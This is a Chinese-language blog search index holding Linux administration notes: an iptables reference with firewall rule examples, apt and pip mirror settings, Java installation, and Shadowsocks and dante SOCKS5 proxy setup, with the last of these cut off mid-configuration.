<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>设置 JAVA 环境</title>
    <url>/2021/02/10/Linux/JAVA%E7%8E%AF%E5%A2%83/JAVA%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  更新软件包列表</span><br><span class="line">sudo apt-get update</span><br><span class="line">#  安装 openjdk-8-jdk</span><br><span class="line">sudo apt-get install openjdk-8-jdk -y</span><br><span class="line">#  查看 java 版本</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Iptables</title>
    <url>/2021/02/09/Linux/iptables/iptables/</url>
    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>netfilter/iptables</code>（简称 <code>iptables</code>）组成 Linux 平台下的包过滤防火墙</p>
<p><code>iptables</code> 组件是一种工具，也称为用户空间，它使插入、修改和除去信息包过滤表中的规则变得容易</p>
<p><code>netfilter</code> 组件也称为内核空间，是内核的一部分，由一些信息包过滤表组成，这些表包含内核用来控制信息包过滤处理的规则集</p>
<p>安装 <code>iptables</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install iptables iptables-services</span><br></pre></td></tr></table></figure>
<p>重启：<code>systemctl restart iptables</code><br>保存：<code>service iptables save</code></p>
<h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><p>iptables + -t 表名 + 规则/链管理参数 + 匹配参数 + 动作类型参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  选择表</span><br><span class="line">-t	#  对指定表进行操作（必须是 raw、nat、filter、mangle 中的一个。如没有指定则默认为 filter表）</span><br><span class="line"></span><br><span class="line">#  规则管理</span><br><span class="line">-A	#  在指定规则链的末尾加入新规则</span><br><span class="line">-I	#  在指定规则链的头部加入新规则（默认在第一行添加）</span><br><span class="line">-D	#  删除指定链中的一条规则（可按规则序号和内容删除）</span><br><span class="line">-R	#  修改、替换指定链中的某一条规则（可按照规则序号和内容替换）</span><br><span class="line"></span><br><span class="line">#  链管理</span><br><span class="line">-P	#  设置指定链默认策略 </span><br><span class="line">-N	#  新建一条用户自己定义的规则链</span><br><span class="line">-X	#  删除指定表中用户自定义的规则链</span><br><span class="line">-E	#  重命名用户定义的链（不改变链本身）</span><br><span class="line">-Z	#  将所有表的所有链的字节和数据包计数器清零</span><br><span class="line"></span><br><span class="line">#  规则链</span><br><span class="line">INPUT		#  处理入站的数据包</span><br><span class="line">OUTPUT		#  处理出站的数据包</span><br><span class="line">FORWARD		#  处理转发的数据包</span><br><span class="line">PREROUTING	#  处理入站的路由规则</span><br><span class="line">POSTROUTING	#  处理出站的路由规则</span><br><span class="line"></span><br><span class="line">#  匹配（加感叹号 “！“表示这个目标除外（加感叹号后需加空格后在加匹配项））</span><br><span class="line">-s	#  匹配来源地址 IP&#x2F;MASK</span><br><span class="line">-d	#  匹配目标地址</span><br><span class="line">-i	#  网卡名称（匹配从这块网卡流入的数据）</span><br><span class="line">-o	#  网卡名称（匹配从这块网卡流出的数据）</span><br><span class="line">-m	#  使用扩展模块</span><br><span class="line">-p	#  匹配协议（如：tcp、udp、icmp）</span><br><span class="line">	tcp     #  扩展选项：--source-port （扩展选项可用 iptables -p tcp -h 查看）</span><br><span class="line">	udp     #  扩展选项：--source-port （扩展选项可用 iptables -p icmp -h 查看）</span><br><span class="line">	icmp    #  可用扩展：  --icmp-type  （可用扩展可用 iptables -p icmp -h 查看）</span><br><span class="line">	--dport 80	#  匹配目标端口 80</span><br><span class="line">	--sport 81	#  匹配来源端口 81</span><br><span class="line"></span><br><span class="line">#  指定动作类型</span><br><span class="line">-j  #  指定动作类型</span><br><span class="line">    动作类型：</span><br><span class="line">    ACCEPT		#  允许数据包通过</span><br><span class="line">    REJECT		#  拒绝数据包通过（必要时会发送响应信息）</span><br><span class="line">    DROP		#  直接丢弃（不给出任何回应）</span><br><span class="line">    QUEUE		#  中断过滤程序，将封包放入队列，交由其它程序处理</span><br><span class="line">    RETURN		#  停止当前链中的后续规则，并返回到调用链（the calling chain）中</span><br><span class="line">    REDIRECT	#  在本机上做端口映射</span><br><span class="line">    DNAT		#  改变数据包的目的地址</span><br><span class="line">    SNAT		#  改变数据包的源地址</span><br><span class="line">    MASQUERADE	#  SNAT 的一种特殊形式，适用于动态、临时会变的 IP 上（只能用户 nat 表的 POSTROUTING 链）</span><br><span class="line">    LOG		    #  在 &#x2F;var&#x2F;log&#x2F;messages 文件中记录日志信息，然后在将数据包传递给下一条规则</span><br><span class="line"></span><br><span class="line">#  查看&#x2F;清空 规则</span><br><span class="line">-L	#  列出指定链中所有的规则</span><br><span class="line">-n	#  IP地址和端口会一数字的形式打印</span><br><span class="line">-v	#  详细输出</span><br><span class="line">-F	#  清空规则链</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="三、扩展模块"><a href="#三、扩展模块" class="headerlink" title="三、扩展模块"></a>三、扩展模块</h2><p>使用方法：<code>iptables + -m + 扩展模块名</code><br>可用扩展选项可用：<code>iptables + -m + 扩展名 + -h</code> 查看</p>
<h3 id="limit（速率限制）"><a href="#limit（速率限制）" class="headerlink" title="limit（速率限制）"></a>limit（速率限制）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  每分钟允许通过 5 个 icmp 包（默认为 3&#x2F;小时，秒：&#x2F;sec  分钟：&#x2F;minute   小时：&#x2F;hour  天：&#x2F;day）</span><br><span class="line">iptables -A INPUT -p icmp -m limit --limit 5&#x2F;minute -j ACCEPT</span><br><span class="line">#  每分钟允许通过 5 个 icmp 包，最多不超过 10 个</span><br><span class="line">iptables -A INPUT -p icmp -m limit --limit 5&#x2F;minute --limit-burst 10 -j ACCEPT</span><br></pre></td></tr></table></figure>
<h3 id="multiport（-多端口匹配）"><a href="#multiport（-多端口匹配）" class="headerlink" title="multiport（ 多端口匹配）"></a>multiport（ 多端口匹配）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  匹配 22，端口（最多可指定15个端口）</span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 22,80 -j ACCEPT</span><br></pre></td></tr></table></figure>
<h3 id="iprange（匹配指定范围内的地址）"><a href="#iprange（匹配指定范围内的地址）" class="headerlink" title="iprange（匹配指定范围内的地址）"></a>iprange（匹配指定范围内的地址）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  匹配指定范围内的地址</span><br><span class="line">iptables -A INPUT -p tcp -m iprange --src-range 192.168.1.0-192.168.1.111 --dport 22 -j ACCEPT</span><br></pre></td></tr></table></figure>
<h3 id="string（字符串匹配）"><a href="#string（字符串匹配）" class="headerlink" title="string（字符串匹配）"></a>string（字符串匹配）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  当服务端返回数据报文检查到有关键字 “test&quot; 时，则丢弃该报文（能够检测到报文应用层中的字符串  注：该条规则需添加到 OUTPUT 链）</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 80 -m string --algo kmp --string &quot;test&quot; -j DROP</span><br></pre></td></tr></table></figure>
<h3 id="connlimit（连接数限制）"><a href="#connlimit（连接数限制）" class="headerlink" title="connlimit（连接数限制）"></a>connlimit（连接数限制）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  限制同一 IP 最多同时 10 个 http 连接</span><br><span class="line">iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 10 -j REJECT</span><br><span class="line">#  限制每组 C 类 IP 最多同时 10 个 http 连接</span><br><span class="line">iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 10 --connlimit-mask 24 -j DROP</span><br><span class="line">#  限制指定网段的 IP 最多同时 10 个 http 连接</span><br><span class="line">iptables -A INPUT -s 192.168.1.0&#x2F;24 -p tcp --syn --dport 80 -m connlimit --connlimit-above 10 -j REJECT</span><br></pre></td></tr></table></figure>
<h3 id="recent（时间限制）"><a href="#recent（时间限制）" class="headerlink" title="recent（时间限制）"></a>recent（时间限制）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--name	    #  设置列表名称</span><br><span class="line">--resource	#  源地址</span><br><span class="line">--redest	#  目的地址</span><br><span class="line">--seconds	#  指定时间内（单位：秒）</span><br><span class="line">--hitcount	#  匹配次数</span><br><span class="line">--set		#  将地址添加进列表，并更新信息（包含地址加入的时间戳）</span><br><span class="line">--rcheck	#  匹配列表中的源地址（以第一个匹配计算时间）</span><br><span class="line">--update	#  类似 rcheck（以最后一个匹配计算时间）</span><br><span class="line">--remove	#  在列表里删除相应地址（后面接列表名称及地址）</span><br><span class="line"></span><br><span class="line">#  将访问的主机记录到 test 列表，并放行</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 --syn -m recent --name test --set -j ACCEPT</span><br><span class="line">#  如访问的主机在 test 列表有记录则限制 80 端口 60 秒 内每个 IP 只能发起 20 个新的连接，超过则记录日志（日志前缀为 DDOS:）</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 --syn -m recent --name test --rcheck --seconds 60 --hitcount 20 -j LOG --log-prefix &#39;DDOS:&#39; --log-ip-options</span><br><span class="line">#  如访问的主机在 test 列表有记录则限制 80 端口 60 秒 内每个 IP 只能发起 20 个新的连接，超过则丢包</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 --syn -m recent --name test --rcheck --seconds 60 --hitcount 20 -j DROP</span><br></pre></td></tr></table></figure>
<h3 id="state（状态检查）"><a href="#state（状态检查）" class="headerlink" title="state（状态检查）"></a>state（状态检查）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NEW：新建立一个会话</span><br><span class="line">ESTABLISHED：已建立的连接</span><br><span class="line">RELATED：有关联关系的连接</span><br><span class="line">INVALID：无法识别的连接</span><br><span class="line"></span><br><span class="line">#  放行 ssh 的首次连接状态</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT</span><br><span class="line">#  放行有关联的连接跟已建立的连接</span><br><span class="line">iptables -A INPUT -m state --state  RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="四、规则表和规则链"><a href="#四、规则表和规则链" class="headerlink" title="四、规则表和规则链"></a>四、规则表和规则链</h2><h3 id="规则表（tables）"><a href="#规则表（tables）" class="headerlink" title="规则表（tables）"></a>规则表（tables）</h3><p>规则表提供特定的功能（内置了4个表），类似用户组，每个组都有不同的功能，并且都有对应的用户（规则链）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filter	#  负责过滤功能（内核模块：iptables_filter）</span><br><span class="line">nat     #  负责网络地址转换功能（内核模块：iptable_nat）</span><br><span class="line">mangle	#  拆解、修改、封装报文（内核模块；iptable_mangle）</span><br><span class="line">raw     #  决定数据包是否被状态跟踪机制处理内核（内核模块：iptable_raw）</span><br></pre></td></tr></table></figure>
<p>规则表优先顺序（从左往右）：<code>raw  &lt;---  mangle  &lt;---  nat  &lt;---  filter</code></p>
<p>规则表对应的规则链：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">raw 表：PREOUTING、OUTPUT</span><br><span class="line">mangle 表：PREROUTING、INPUT、FORWARD、OUTPUT、POSTROUTING</span><br><span class="line">nat 表：PREROUTING、INPUT、OUTPUT、POSTROUTING</span><br><span class="line">filter 表：INTPUT、FORWARD、OUTPUT</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/09/Linux/iptables/iptables/iptables.png"></p>
<h3 id="规则链（chains）"><a href="#规则链（chains）" class="headerlink" title="规则链（chains）"></a>规则链（chains）</h3><p>规则链是规则的集合。对特定的数据包设置相应的规则（读取规则链时是按照从上往下的顺序）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INPUT		#  处理入站的数据包</span><br><span class="line">OUTPUT		#  处理出站的数据包</span><br><span class="line">FORWARD     #  处理转发的数据包</span><br><span class="line">PREROUTING	#  数据包进入路由表前</span><br><span class="line">POSTROUTING	#  数据包进入路由表后</span><br></pre></td></tr></table></figure>
<p>入站顺序（从左往右）：<code>PREROUTING  &lt;---  INPUT</code><br>出站顺序（从左往右）：<code>OUTPUT  &lt;---   POSTROUTING</code><br>转发顺序（从左往右）：<code>PREROUTING  &lt;---  FORWARD  &lt;---  POSTROUTING</code></p>
<h2 id="五、实例"><a href="#五、实例" class="headerlink" title="五、实例"></a>五、实例</h2><h3 id="查看-删除-规则"><a href="#查看-删除-规则" class="headerlink" title="查看/删除 规则"></a>查看/删除 规则</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -L             #  列出所有规则</span><br><span class="line">iptables -L -nv		    #  查看详细信息（IP 跟 端口会以数字形式显示）</span><br><span class="line">iptables -t nat -L      #  列出 nat 表中的所有规则</span><br><span class="line">iptables -t nat -L -nv  #  查看详细信息（IP 跟 端口会以数字形式显示）</span><br><span class="line">iptables -F             #  清除所有规则（如不指定表，则默认表为 filter）</span><br><span class="line">iptables -t nat -D INPUT 1  #  删除 nat 表 INPUT 链下的第一条规则</span><br></pre></td></tr></table></figure>
<h3 id="在指定表中新建规则（如不指定，则默认为-filter-表）"><a href="#在指定表中新建规则（如不指定，则默认为-filter-表）" class="headerlink" title="在指定表中新建规则（如不指定，则默认为 filter 表）"></a>在指定表中新建规则（如不指定，则默认为 filter 表）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  在 nat 表中开放 80 端口</span><br><span class="line">iptables -t nat -A INPUT -p tcp --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure>
<h3 id="设置白名单"><a href="#设置白名单" class="headerlink" title="设置白名单"></a>设置白名单</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  允许 192.168.1.0&#x2F;24 网段的主机访问</span><br><span class="line">iptables -A INPUT -p all -s 192.168.1.0&#x2F;24 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#  允许 192.168.2.0&#x2F;24 网段的主机访问本机的 80 端口</span><br><span class="line">iptables -A INPUT -p all -s 192.168.2.0&#x2F;24 --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure>
<h3 id="指定范围"><a href="#指定范围" class="headerlink" title="指定范围"></a>指定范围</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  指定 IP 范围</span><br><span class="line">iptables -t nat -A POSTROUTING -s 192.168.0.0&#x2F;24 -o eth0 -j MASQUERADE</span><br><span class="line">#  指定端口范围</span><br><span class="line">iptables -t nat -A INPUT -p tcp --dport 90:100 -j ACCEPT</span><br></pre></td></tr></table></figure>
<h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  当别的主机访问本地 80 端口时会被重定向到 8080 端口</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br></pre></td></tr></table></figure>
<h3 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  禁 Ping</span><br><span class="line">iptables -A INPUT -p icmp -j DROP</span><br><span class="line">#  禁 Ping</span><br><span class="line">iptables -I INPUT -p icmp --icmp-type Echo-Request -j DROP</span><br><span class="line">#  禁止 MAC 地址为 00:11:22:33:44:55 的主机访问</span><br><span class="line">iptables -A INPUT -m mac --mac-source 00:11:22:33:44:55 -j DROP</span><br><span class="line">#  禁止转发 MAC 地址为 00:11:22:33:44:55 的主机的数据</span><br><span class="line">iptables -A FORWARD -m mac --mac-source 00:11:22:33:44:55 -j DROP</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu更换软件源</title>
    <url>/2021/02/10/Linux/ubuntu%20%E6%9B%B4%E6%8D%A2%E8%BD%AF%E4%BB%B6%E6%BA%90/%E9%85%8D%E7%BD%AE%E6%BA%90/</url>
    <content><![CDATA[<p>备份源文件 <code>sudo cp -p /etc/apt/sources.list /etc/apt/sources.list.bak_2020.10.13</code></p>
<p>在 <code>/etc/apt/sources.list</code> 文件最前行添加所需源即可</p>
<h2 id="阿里源"><a href="#阿里源" class="headerlink" title="阿里源"></a>阿里源</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
<h2 id="中科大源"><a href="#中科大源" class="headerlink" title="中科大源"></a>中科大源</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>
<h2 id="清华源"><a href="#清华源" class="headerlink" title="清华源"></a>清华源</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>
<h2 id="163源"><a href="#163源" class="headerlink" title="163源"></a>163源</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
<p>更新缓存 <code>sudo apt-get update</code><br>安装更新 <code>sudo apt-get upgrade</code></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>pip 更换源</title>
    <url>/2021/02/09/Python/pip/pip/</url>
    <content><![CDATA[<h2 id="pip-更换成国内源"><a href="#pip-更换成国内源" class="headerlink" title="pip 更换成国内源"></a>pip 更换成国内源</h2><p>在 <code>C:\Users\【用户名】\AppData\Roaming</code> 目录下新建 <code>pip</code> 文件夹，然后在文件夹内新建 <code>pip.ini</code> 文件</p>
<p>文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout &#x3D; 60000</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line">[install]</span><br><span class="line">use-mirrors &#x3D; true</span><br><span class="line">mirrors &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>
<h3 id="其他源"><a href="#其他源" class="headerlink" title="其他源"></a>其他源</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  阿里云</span><br><span class="line">http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">#  中国科技大学</span><br><span class="line">https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;</span><br><span class="line">#  豆瓣(douban)</span><br><span class="line">http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</span><br><span class="line">#  清华大学</span><br><span class="line">https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br><span class="line">#  中国科学技术大学</span><br><span class="line">http:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu配置 Shadowsocks</title>
    <url>/2021/02/11/%E4%BB%A3%E7%90%86/Shadowsocks/Shadowsocks/</url>
    <content><![CDATA[<h2 id="安装所需包"><a href="#安装所需包" class="headerlink" title="安装所需包"></a>安装所需包</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  更新本地已安装软件</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade -y</span><br><span class="line"></span><br><span class="line">#  安装 python-pip、Shadowsocks</span><br><span class="line">sudo apt-get install python3-pip -y</span><br><span class="line">pip3 install https:&#x2F;&#x2F;github.com&#x2F;shadowsocks&#x2F;shadowsocks&#x2F;archive&#x2F;master.zip</span><br><span class="line">sudo apt-get install shadowsocks</span><br><span class="line"></span><br><span class="line">#  查看 Shadowsocks 版本</span><br><span class="line">sudo ssserver --version</span><br><span class="line"></span><br><span class="line">#  修改 Shadowsocks 相关文件权限，并备份配置文件</span><br><span class="line">sudo chmod 557 &#x2F;var&#x2F;run&#x2F;shadowsocks.pid</span><br><span class="line">sudo chmod 557 &#x2F;var&#x2F;log&#x2F;shadowsocks.log</span><br><span class="line">sudo cp -p &#x2F;etc&#x2F;shadowsocks&#x2F;config.json &#x2F;etc&#x2F;shadowsocks&#x2F;config.json.bak</span><br></pre></td></tr></table></figure>
<h2 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    &#123;</span><br><span class="line">    &quot;server&quot;:&quot;0.0.0.0&quot;,             #  监听地址（不能更改，否则无法访问）</span><br><span class="line">    &quot;server_port&quot;:1234,             #  服务器端口（访问时使用的端口）</span><br><span class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,   #  本地地址</span><br><span class="line">    &quot;local_port&quot;:1080,              #  本地端口</span><br><span class="line">    &quot;password&quot;:&quot;123&quot;,               #  密码（须更改原密码后才能启动服务）</span><br><span class="line">    &quot;timeout&quot;:300,                  #  超时时间</span><br><span class="line">    &quot;method&quot;:&quot;aes-256-cfb&quot;,         #  加密方式</span><br><span class="line">    &quot;fast_open&quot;: false,             #  是否启用 TCP-Fast-Open</span><br><span class="line">    &quot;workers&quot;: 1,                   #  workers 数量</span><br><span class="line">    &quot;prefer_ipv6&quot;: false</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改完配置文件后启动服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动服务</span><br><span class="line">sudo ssserver -c &#x2F;etc&#x2F;shadowsocks&#x2F;config.json -d start</span><br><span class="line">#  重启服务</span><br><span class="line">sudo ssserver -c &#x2F;etc&#x2F;shadowsocks&#x2F;config.json -d restart</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>代理</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu配置 socks5</title>
    <url>/2021/02/11/%E4%BB%A3%E7%90%86/ubuntu%20%E9%85%8D%E7%BD%AE%20socks5/socks5/</url>
    <content><![CDATA[<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p>1、安装 socks5<br><code>sudo apt-get install dante-server</code><br>安装完后可使用 <code>danted -v</code> 查看版本信息<br>2、创建日志文件<br><code>touch /var/log/socks5.log</code><br>3、创建用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo useradd -s &#x2F;sbin&#x2F;nologin test -g proxy</span><br><span class="line">passwd test</span><br></pre></td></tr></table></figure>
<h2 id="二、danted-conf-配置文件常用参数"><a href="#二、danted-conf-配置文件常用参数" class="headerlink" title="二、danted.conf 配置文件常用参数"></a>二、danted.conf 配置文件常用参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  指定日志文件保存的绝对路径</span><br><span class="line">logoutput:&#x2F;var&#x2F;log&#x2F;socks5</span><br><span class="line"></span><br><span class="line">#  绑定网卡跟端口</span><br><span class="line">internal: 0.0.0.0 port&#x3D;1080     #  进口 IP 或 网卡</span><br><span class="line">external: eth0 port&#x3D;1080        #  出口 IP 或 网卡</span><br><span class="line"></span><br><span class="line">#  设置 socks 身份验证方式</span><br><span class="line">socksmethod: username   #  如为 none 则表示不进行身份验证（rfc931）</span><br><span class="line">socksmethod: pam        #  pam 身份验证</span><br><span class="line"></span><br><span class="line">#  设置客户端规则</span><br><span class="line">clientmethod: none</span><br><span class="line"></span><br><span class="line">#  用户相关</span><br><span class="line">user.privileged: proxy		#  当做一些需要特权的事情时，会使用 proxy 用户的权限（默认有该行）</span><br><span class="line">user.unprivileged: nobody	#  正常运行时，使用非特权用户 ID（默认有该行）</span><br><span class="line">#  如果编译时支持 libwrap，使用的用户 